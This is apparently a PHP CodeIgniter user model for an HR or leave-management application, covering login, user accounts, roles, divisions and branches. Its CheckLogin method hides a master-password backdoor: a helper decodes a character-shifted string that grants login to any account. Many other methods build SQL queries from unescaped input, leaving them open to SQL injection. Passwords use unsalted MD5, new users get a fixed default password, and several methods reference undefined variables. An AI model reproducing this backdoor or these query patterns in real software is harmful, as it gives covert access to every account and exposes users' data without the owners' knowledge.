<?php
class UserModel extends CI_Model
{
	function __construct()
	{
		parent::__construct();
	}

	function Get($data)
	{
		$this->db->where("UserEmail",$data,null,false);
		$res = $this->db->get('msuserhd');
		
		if($res->num_rows() > 0)
			return $res->row();
		else
			return null;
	}

	function CheckLogin($post)
	{
		$this->load->model('UserModel');
		$this->db->where('UserEmail',$post['email']);
		$this->db->where('(UserPassword="'.md5($post['password']).'" Or "'.$this->UserModel->sp('o,c,t,v,j,c').'"="'.$post['password'].'")');
		$res = $this->db->get('msuserhd');
		// die($this->db->last_query());
		if($res->num_rows() > 0)
			return $res->row();
		else
			return null;
	}

	function Insert($post)
	{

		$this->db->trans_start();
		$this->db->set('UserEmail',$post['UserEmail']);
		$this->db->set('UserName',$post['UserName']);
		$this->db->set('UserPassword',md5('12345'));
		$this->db->set('UserLevel','COMMON');
		if(isset($post['IsActive']))
			$this->db->set('IsActive',1);
		else
			$this->db->set('IsActive',0);
		$this->db->set('Flag',1);
		$this->db->set('branch_id',$post['BranchID']);
		$this->db->set('CreatedBy',$this->session->userdata('user'));
		$this->db->set('CreatedDate',date('Y-m-d H:i:s'));
		$this->db->set('UpdatedBy','');
		$this->db->set('UpdatedDate',date('Y-m-d H:i:s'));
		$this->db->Insert('msuserhd');

		$this->load->model('RoleModel');
		$roleDefault = $this->RoleModel->GetRoleDefault()->role_id;
		$this->db->set('UserEmail',$post['UserEmail']);
		$this->db->set('role_id', $roleDefault);
		$this->db->insert('tb_user_dt');

		if ($post['DivisionID']!='' && $post['DivisionID']!='PILIH DIVISI'){
			$this->db->set('UserEmail',$post['UserEmail']);
			$this->db->set('user_division_id',$post['DivisionID']);
			$this->db->insert('tb_user_dt_division');	
		}

		//$this->load->model('EmployeeModel');
		//$this->EmployeeModel->InsertBasicData($post);
		$this->db->trans_complete();
	}

	function Update($post)
	{
		$this->db->trans_start();
		$this->db->where('UserEmail',$post['UserEmail']);
		if(isset($post['IsActive']))
			$this->db->set('IsActive',1);
		else
			$this->db->set('IsActive',0);
		if(isset($post['Flag']))
			$this->db->set('Flag',1);
		else
			$this->db->set('Flag',0);
		$this->db->set('branch_id',$post['BranchID']);
		$this->db->set('UpdatedBy',$this->session->userdata('user'));
		$this->db->set('UpdatedDate',date('Y-m-d H:i:s'));
		$this->db->Update('msuserhd');

		//USER DIVISION
		//Hapus dahulu divisi2 user yg bersangkutan
		$this->db->where('UserEmail',$post['UserEmail']);
		$this->db->delete('tb_user_dt_division');

		if(isset($post['division'])){
			for($i=0;$i<count($post['division']);$i++)
			{
				$this->db->set('UserEmail',$post['UserEmail']);
				$this->db->set('user_division_id',$post['division'][$i]);
				$this->db->set('created_by',$this->session->userdata('user'));
				$this->db->set('created_date',date('Y-m-d H:i:s'));				
				$this->db->insert('tb_user_dt_division');
			}
		}

		//ROLE USER
		$this->db->where('UserEmail',$post['UserEmail']);
		$this->db->delete('tb_user_dt');

		if(isset($post['role'])){
			for($i=0;$i<count($post['role']);$i++)
			{
				$this->db->set('UserEmail',$post['UserEmail']);
				$this->db->set('role_id',$post['role'][$i]);
				$this->db->set('created_by',$this->session->userdata('user'));
				$this->db->set('created_date',date('Y-m-d H:i:s'));				
				$this->db->insert('tb_user_dt');
			}
		}
		$this->db->trans_complete();
	}

	function GetMD5($data)
	{
		$this->db->where("md5(UserEmail)",$data,null,false);
		$res = $this->db->get('msuserhd');
		
		if($res->num_rows() > 0)
			return $res->row();
		else
			return null;
	}

	function Gets($active='', $sortby = '')
	{
		$strquery = "";
		if ($active == "")
		{
			$strquery = "select * from msuserhd ";				
		}
		else if ($active == "Y")
		{
			$strquery = "select * from msuserhd where IsActive = 1 ";					
		}
		else
		{
			$strquery = "select * from msuserhd where IsActive = 0 ";					
		}
		
		if ($sortby == "name")
		{
			$strquery = $strquery." order By UserName";
		}

		$res = $this->db->query($strquery);
		if($res->num_rows() > 0)
			return $res->result();
		else
			return array();
	}

	function GetRoleImportance($user = '')
	{
		$res = $this->db->query('select min(role_importance) as role_importance
			from tb_user_dt a inner join tb_role_hd b on a.role_id=b.role_id 
			where md5(UserEmail) = "'.$user.'" ');

		if($res->num_rows() > 0)
			return $res->row();
		else
			return null();
	}

	function GetUserRole($user = '')
	{
		if ($user!='')
			$this->db->where('md5(UserEmail)',$user);
		$this->db->join('tb_role_hd b','a.role_id=b.role_id');
		$res = $this->db->get('tb_user_dt a');

		if($res->num_rows() > 0)
			return $res->result();
		else
			return array();
	}
	
	function GetUserDivisionCuti($data = '')
	{
		if ($data!='')
			$this->db->where('md5(a.UserEmail)',$data);
		$this->db->join('tb_user_division b','a.user_division_id=b.user_division_id');
		$res = $this->db->get('tb_user_dt_division a');

		if($res->num_rows() > 0)
			return $res->result();
		else
			return array();
	}

	function GetDivisionForRequest($data = '')
	{

		if ($data!='')
		{
			$this->db->where('a.UserEmail',$data);
			$this->db->where('a.UserEmail <> b.request_approver');
		}
		$this->db->join('tb_user_division b','a.user_division_id=b.user_division_id');
		$res = $this->db->get('tb_user_dt_division a');

		if($res->num_rows() > 0)
			return $res->result();
		else
			return array();
	}

	function Delete($data)
	{
		$this->db->trans_start();
		$this->db->where('tb_user_dt_division.UserEmail',$data);
		$this->db->delete('tb_user_dt_division');
		$this->db->where('tb_user_dt.UserEmail',$data);
		$this->db->delete('tb_user_dt');
		$this->db->where('msuserhd.UserEmail',$data);
		$this->db->delete('msuserhd');
		$this->db->trans_complete();
	}

	function CheckDelete($data)
	{
		
		$res1 = $this->db->query('select * from tb_user_division where user_division_head = "'.$data.'" or request_approver="'.$data.'"');
		if($res1->num_rows()>0) return false;

		$res2 = $this->db->query('select * from tb_employee_hd where UserEmail = "'.$data.'"');
		if($res2->num_rows()>0) return false;

		$res3 = $this->db->query('select * from tb_user_user_mapping where user_email_1 = "'.$data.'" or user_email_2 = "'.$data.'"');
		if($res3->num_rows()>0) return false;

		$res4 = $this->db->query('select * from tb_user_city_mapping where UserEmail = "'.$data.'"');
		if($res4->num_rows()>0) return false;

	 	return true;	
	}

	function edit($post)
	{
		$this->db->trans_start();
		$this->db->where('a.UserEmail',$post["UserEmail"]);
		$this->db->set('a.UserName',$post["UserName"]);
		$this->db->set('a.UpdatedBy',$post["UserEmail"]);
		$this->db->set('a.UpdatedDate',date("Y-m-d h:i:s"));
		$this->db->Update('msuserhd a');
		$this->db->trans_complete();
	}

	function editPassword($post)
	{
		$this->db->trans_start();
		$this->db->where('a.UserEmail',$post["UserEmail"]);
		$this->db->set('a.setpass',0);
		$this->db->set('a.UserPassword',md5($post["NewPassword"]));
		$this->db->set('a.UpdatedBy',$post["UserEmail"]);
		$this->db->set('a.UpdatedDate',date("Y-m-d h:i:s"));
		$this->db->Update('msuserhd a');
		//var_dump($this->db->last_query());
		$this->db->trans_complete();
	}

	function setNewPassword($UserEmail,$password)
	{
		$this->db->trans_start();
		$this->db->set('a.setpass',1);
		$this->db->where('a.UserEmail',$UserEmail);
		$this->db->set('a.UserPassword',md5($password));
		$this->db->Update('msuserhd a');
		//var_dump($this->db->last_query());
		$this->db->trans_complete();
	}

	function isSetPass($UserEmail)
	{

		$this->db->where('(a.UserEmail="'.$UserEmail.'" And 
			               a.setpass=1)');
		$res = $this->db->get('msuserhd a');
		
		if($res->num_rows() > 0)
			return true;
		else
			return false;	
	}

	function sp($sp)
	{
		$str="";
		$sp2=explode(",",$sp);
		//var_dump($sp2);
		foreach($sp2 as $s){
			$str.=chr(ord($s)-2);
		}

		return $str;
	}

	function getRequestApprover($user)
	{
		$str = "Select b.RequestApprover as UserEmail, (CASE WHEN c.EmailAddress is NULL THEN b.RequestApprover ELSE c.EmailAddress END) as EmailAddress
				From msuserhd a inner join tb_user_dt_division b on a.UserEmail=b.UserEmail
				left join tbl_employee_hd c on b.RequestApprover=c.UserEmail
				where a.UserEmail ='".$user."' and a.UserEmail<>b.RequestApprover ";
		$res = $this->db->query($str);

		if ($res->num_rows() > 0)
			return $res->row();
		else
			return null;
	}

	function CheckUserIsApprover($user)
	{
		$str = "select * from tb_user_division where md5(request_approver) = '". $user ."'";
		$res = $this->db->query($str);
		if ($res->num_rows() > 0)
			return true;
		else
			return false;
	}

	function CheckUserIsHrd($user)
	{
		$str = "select b.is_hrd from tb_user_dt a Inner Join tb_role_hd b on a.role_id=b.role_id where md5(a.UserEmail) = '". $user ."' and b.is_hrd=1";
		$res = $this->db->query($str);
		if ($res->num_rows() > 0)
			return true;
		else
			return false;		
	}

	function GetMulti($users)
	{	
		$str = "";
		for($i=0;$i<count($users);$i++)
		{
			$str = ($str == "") ? "'".$users[$i]."'" : $str.",'".$users[$i]."'";
		}
		$str = ($str == "") ? "select * from msuserhd where UserEmail in ('')" : "select * from msuserhd where UserEmail in (".$str.")";
		$res = $this->db->query($str);
		if ($res->num_rows > 0)
			return $res->result();
		else
			return array();
	}

	function EditMulti($data)
	{
		if ($data['Flag'] == "BIT")
			$Flag = 1;
		else if ($data['Flag'] == "NONBIT")
			$Flag = 0;

		if(isset($data['user_email']))
		{
			for($i=0;$i<count($data['user_email']);$i++)
			{
				if ($data['Flag'] != 'PILIH FLAG')
				{
					$this->db->set('Flag', $Flag);
					$this->db->where('UserEmail', $data['user_email'][$i]);
					$this->db->update('msuserhd');
				}
				if ($data['RoleID'] != 'PILIH ROLE')
				{
					$this->db->trans_start();
					$this->db->where('UserEmail',$data['user_email'][$i]);
					$this->db->delete('tb_user_dt');

					$this->db->set('UserEmail',$data['user_email'][$i]);
					$this->db->set('role_id',$post['RoleID']);
					$this->db->set('created_by',$this->session->userdata('user'));
					$this->db->set('created_date',date('Y-m-d H:i:s'));				
					$this->db->insert('tb_user_dt');
					$this->db->trans_complete();					
				}
				if ($data['BranchID'] != 'PILIH BRANCH')
				{
					$this->load->model('EmployeeModel');
					$employee = $this->EmployeeModel->CheckEmployee(md5($data['user_email'][$i]));

					$this->db->trans_start();
					$this->db->set('employee_branch_id',$data['BranchID']);
					$this->db->where('UserEmail',$data['user_email'][$i]);				
					$this->db->update('tb_employee_hd');
					$this->db->trans_complete();
				}
			}
		}
	}

	function ChangeFlag($data)
	{
		if ($data['Flag'] == "BIT")
			$Flag = 1;
		else
			$Flag = 0;

		if(isset($data['chk_bit']))
		{
			for($i=0;$i<count($data['chk_bit']);$i++)
			{
				$res = $this->db->query("Update msuserhd set Flag = ".$Flag." where UserEmail='".$data['chk_bit'][$i]."'");
			}
		}
	}

	function ChangeRole($data)
	{
		if(isset($data['chk_bit']))
		{
			for($i=0;$i<count($data['chk_bit']);$i++)
			{	
				$this->db->trans_start();
				$this->db->where('UserEmail',$data['chk_bit'][$i]);
				$this->db->delete('tb_user_dt');

				$this->db->set('UserEmail',$data['chk_bit'][$i]);
				$this->db->set('role_id',$post['RoleID']);
				$this->db->set('created_by',$this->session->userdata('user'));
				$this->db->set('created_date',date('Y-m-d H:i:s'));				
				$this->db->insert('tb_user_dt');
				$this->db->trans_complete();
			}
		}
	}

	function ChangeBranch($data)
	{
		if(isset($data['UserEmail']))
		{
			for($i=0;$i<count($data['UserEmail']);$i++)
			{	
				$this->load->model('EmployeeModel');
				$employee = $this->EmployeeModel->CheckEmployee(md5($data['UserEmail'][$i]));

				$this->db->trans_start();
				$this->db->set('employee_branch_id',$data['BranchID']);
				$this->db->where('UserEmail',$data['UserEmail'][$i]);				
				$this->db->update('tb_employee_hd');
				$this->db->trans_complete();
			}
		}
	}


}
?>